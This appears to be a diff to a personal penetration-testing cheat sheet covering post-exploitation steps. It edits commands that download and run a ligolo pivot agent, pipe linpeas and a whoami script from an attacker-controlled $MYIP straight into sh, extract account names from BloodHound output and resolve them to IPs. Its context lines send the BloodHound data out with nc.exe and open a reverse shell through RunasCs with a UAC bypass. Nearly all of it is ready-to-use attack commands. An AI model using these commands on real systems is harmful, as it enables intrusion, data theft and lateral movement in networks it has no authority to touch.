@@ -1441,7 +1441,7 @@ scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 13
 -->> New Configuration
 sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8080
 curl $MYIP/linux/agent -o /dev/shm/agent; chmod +x /dev/shm/agent; /dev/shm/agent -ignore-cert -connect $MYIP:8080
-curl $MYIP/windows/agent.exe -o \programdata\agent; \programdata\agent -ignore-cert -connect $MYIP:8080
+curl $MYIP/windows/agent.exe -o \programdata\agent.exe && C:\programdata\agent.exe -ignore-cert -connect $MYIP:8080
 session 1
 interface_create --name ligolo
 tunnel_start --tun ligolo
@@ -1489,13 +1489,13 @@ CTRL-Z; stty size; stty raw -echo; fg; export SHELL=bash; export TERM=xterm-256c
 export PATH=/dev/shm:$PATH
 
 [*] File Transfer
-curl -s $MYIP:53/linux/linpeas.sh | sh
-wget -qO- $MYIP:53/linux/linpeas.sh | sh
+curl -s $MYIP/linux/linpeas.sh | sh
+wget -qO- $MYIP/linux/linpeas.sh | sh
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
-curl -s $MYIP:53/whoami.sh | sh
-curl -s $MYIP:53/linux/linpeas.sh | sh
+curl -s $MYIP/whoami.sh | sh
+curl -s $MYIP/linux/linpeas.sh | sh
 
 +---------- Setup Pivot ----------+
 curl $MYIP/linux/agent -o /dev/shm/agent;chmod +x /dev/shm/agent;/dev/shm/agent -ignore-cert -connect $MYIP:8080
@@ -1743,6 +1743,11 @@ curl $MYIP/windows/Sharphound.exe -o \programdata\Sharphound.exe; \programdata\S
 curl $MYIP/windows/nc.exe -o \programdata\nc.exe
 \programdata\nc.exe $MYIP 80 < \programdata\BloodHound.zip
 rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
+cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | tee usernames_$DC
+cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC
+
++---------- Identify Hosts from Computers ----------+
+sort -u computers_$DC | sed 's/\$$//' | paste -sd, - | sed 's/^/@("/;s/,/","/g;s/$/")|%{ $comp=$_; $r=Resolve-DnsName $comp -Type A -EA 0; if($r){ $r|%{[pscustomobject]@{Name=$comp;IP=$_.IPAddress}}}}|ft -auto/'
 
 +---------- Switch User: Known Creds ----------+
 //$MYIP/$/RunasCs.exe --bypass-uac --logon-type 8 $USERNAME $PASSWORD cmd.exe -r $MYIP:8443
